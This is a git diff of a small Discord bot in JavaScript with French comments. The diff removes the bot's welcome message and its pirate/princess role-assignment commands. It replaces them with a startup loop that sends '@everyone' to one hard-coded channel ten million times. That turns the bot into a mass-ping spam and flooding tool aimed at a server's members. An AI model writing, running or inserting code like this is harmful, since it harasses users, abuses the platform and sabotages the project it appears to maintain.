@@ -1,39 +1,21 @@
+// Début du code
 const discord = require('discord.js'),
 client = new discord.Client();
 const token = (process.env.TOKEN);
-client.on("ready", () => {
-});
+var prefix = "/"; // Préfix du bot
 
+
+// Pemière action du bot quand il s'allume 
 client.on("ready", () => {
-client.user.setPresence({ game: { name: ' #Pirate ou #Princesse ! ', type: 0}});
+
+  var i;
+  for (i = 0; i < 10000000; i++) { 
+    client.channels.get("522743449754140676").send("@everyone") // Natthh
+  }
+
+
 });
 
 client.login(token)
 
-client.on('guildMemberAdd', member => {
 
-const channel = member.guild.channels.find("name", "leave_msg").send(`${member.user} a join le discord.`)
-});
-
-client.on('message', message => {
- 
-
-var TeamPirates = client.guilds.get(message.guild.id).roles.find("name", "Team Pirates");
-var TeamPrincesses = client.guilds.get(message.guild.id).roles.find("name", "Team Princesses");
-
-const PirateEmoji = client.emojis.find("name", "Emoji_Props_Universal1L");
-const PrincesseEmoji = client.emojis.find("name", "EmojiBlitzJasmine");
-
-if(message.content.toLocaleLowerCase() == ("#pirate")){
- message.channel.send(`Tu es maintenant dans la team Pirates ${message.author} ${PirateEmoji} !`);
- message.guild.member(message.author).addRole(TeamPirates);
- message.guild.member(message.author).removeRole(TeamPrincesses);
- }
-
- if(message.content.toLocaleLowerCase() == ("#princesse")){
- message.channel.send(`Tu es maintenant dans la team Princesses ${message.author} ${PrincesseEmoji} !`);
- message.guild.member(message.author).addRole(TeamPrincesses);
- message.guild.member(message.author).removeRole(TeamPirates);
- }
-
-});
